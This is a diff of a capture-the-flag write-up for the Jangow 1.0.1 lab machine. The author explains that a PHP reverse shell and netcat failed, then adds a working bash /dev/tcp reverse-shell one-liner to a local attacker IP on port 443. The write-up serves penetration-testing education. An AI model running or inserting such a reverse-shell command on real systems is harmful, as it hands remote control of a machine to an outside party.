@@ -55,7 +55,12 @@ And here is the flag for the user.
  to gain root level access, I wanted to get a shell access so i used pentestmonkey's php reverse shell located in /usr/share
  /webshells/php/php-reverse.php and modified the file.
  ![image](https://github.com/harunsvnc/Jangow-1.0.1-Write-up/assets/75423540/24047265-8f56-471e-bada-0fdd0c130221)
-via FTP uploaded to the target and started a netcat listener.
+via FTP uploaded to the target and started a netcat listener. But it didn't work, also i tried netcat to get a reverse shell didn't work as well in my case. finally i used bash's builtin function of /dev/tcp on port 443 and it worked.
+/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.102/443 0>&1 '
+![image](https://github.com/harunsvnc/Jangow-1.0.1-Write-up/assets/75423540/d06232a2-c072-4a82-8da3-ba7db469704e)
+![image](https://github.com/harunsvnc/Jangow-1.0.1-Write-up/assets/75423540/293d1e97-4114-4888-97a1-8f05415f1610)
+And here is the user's flag.
+![image](https://github.com/harunsvnc/Jangow-1.0.1-Write-up/assets/75423540/e777a706-dcf3-427b-a292-86a0fc79ea1a)
 
 
 
